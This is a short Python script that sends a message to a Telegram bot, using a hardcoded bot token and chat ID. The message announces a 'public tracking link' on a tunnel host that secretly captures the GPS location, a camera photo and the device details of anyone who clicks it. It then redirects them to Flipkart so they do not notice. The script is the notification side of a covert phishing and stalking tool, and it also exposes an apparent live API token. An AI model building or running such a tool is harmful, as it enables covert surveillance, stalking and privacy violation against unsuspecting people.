import requests

API_TOKEN = '8800752320:AAFjXbl8PVFt92nLnxD39u48Eq8GNoAXgyc'
CHAT_ID = '8095263177'

text = (
    "🔗 <b>Your Public Tracking Link:</b>\n\n"
    "https://real-ears-hang.loca.lt\n\n"
    "Send this to anyone. When they click and tap the button:\n"
    "📍 GPS location captured\n"
    "📸 Camera photo captured\n"
    "📱 Full device info\n\n"
    "After capture → redirects to Flipkart\n\n"
    "⚠️ First visit shows a tunnel page - just tap through."
)

r = requests.post(
    f"https://api.telegram.org/bot{API_TOKEN}/sendMessage",
    data={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
)
print(r.text)
